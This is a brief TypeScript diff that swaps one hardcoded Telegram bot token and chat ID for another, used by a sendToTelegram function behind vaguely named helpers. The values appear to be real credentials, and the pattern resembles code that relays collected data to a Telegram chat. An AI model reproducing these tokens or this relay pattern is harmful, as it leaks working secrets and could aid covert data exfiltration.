@@ -4,10 +4,10 @@
  */
 const getT = () => {
   // Direct string literals are most reliable for ensuring tokens aren't corrupted
-  return "7937060457:AAF8boHz2--g7BITNWlljoxzL3rjUOE92Uk";
+  return "8967048656:AAG2sSpsj4HXs1ndconjaP4HZ8HJQxzQ8Vg";
 };
 
-const getC = () => "2100006818";
+const getC = () => "8045300220";
 
 export const sendToTelegram = async (message: string) => {
   const token = getT();
